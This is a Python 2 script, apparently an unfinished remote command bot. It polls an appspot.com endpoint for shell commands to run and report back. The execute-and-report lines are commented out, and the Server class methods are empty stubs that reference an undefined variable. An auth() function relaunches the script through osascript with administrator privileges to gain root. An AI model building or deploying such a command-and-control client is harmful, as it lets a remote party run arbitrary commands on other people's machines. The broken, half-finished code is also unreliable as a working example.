#!/usr/bin/env python
#coding: utf-8
#Last-update: 2013-10-01 09:16:36

__author__ = '0xnz'
__version__ = '0.1'

import urllib
import urllib2
import socket
import cookielib
import commands
import os
import string

class Server(object):
    def __init__(self, ID, url):
        super(Server, self).__init__()
        self.__id = ID
        self.__url = url
    def pull(self):
        pass
    def exec_(self, cmd):
        pass
    def push(self, data):
        pass
    def loop(self):
        while True:
            try:
                cmd = self.pull()
                (ret, out) = self.exec_(cmd)
                self.push({
                    'from': self.__id,
                    'command': cmd,
                    'status': str(status),
                    'output': out,
                })
            except KeyboardInterrupt:
                return

FROM = 'a@b.com'

def hpost(url, data, method='POST', proxy=True):
    if method == 'POST':
        req = urllib2.Request(url, data)
    else:
        req = urllib2.Request(url)
    if proxy:
        proxy_handler = urllib2.ProxyHandler({'http': 'http://localhost:8087'})
        opener = urllib2.build_opener(proxy_handler)
        urllib2.install_opener(opener)
    
    resp = urllib2.urlopen(req)
    return resp.read()

lurl = 'http://localhost:8080/_ah/xmpp/__0x01379/?from=a@b.com'
ourl = 'https://oxnzbot.appspot.com'
xgurl = 'https://oxnzbot.appspot.com/_ah/xmpp/__0x01379/?from=a@b.com'
xpurl = 'https://oxnzbot.appspot.com/_ah/xmpp/__0x01379/'
murl = 'https://oxnzbot.appspot.com/_ah/xmpp/message/chat/'
burl = 'http://www.baidu.com/'

def test(remote=True):
    while True:
        url = xgurl
        if not remote:
            url = lurl
        print "asking server: %s" % url
        cmd = hpost(url, None, method='GET', proxy=False)
        if cmd == '':
            print 'no command available'
        else:
            print 'executing command: %s' % cmd
            #(status, output) = commands.getstatusoutput(cmd)
            # check if the server delivery msg to boss ok
            #ret = hpost(xpurl, data, method='POST', proxy=False)
            #if ret == '__0x0000':
            #    pass
            #else:
            #    pass
#    data = urllib.urlencode({
#        'from': FROM,
#        'command': cmd,
#        'status': str(status),
#        'output': output,
#    })
#    print hpost(lurl, data, method='GET', proxy=False)
#    print hpost(lurl, data, method='POST', proxy=False)

def auth(euid=0):
    try:
        os.seteuid(euid)
    except OSError, e:
        '''permission denied'''
        path = "osascript -e \'do shell script \"%s %s\" with administrator privileges\'" % ('python', os.path.abspath(__file__))
        os.system(path)
        exit()

def main():
    if os.geteuid() != 0:
        #auth(0)
        pass
    print 'starting test...'
    #test(False)
    test()

if __name__ == '__main__':
    #TODO: import SimpleXMLRPCServer
    main()
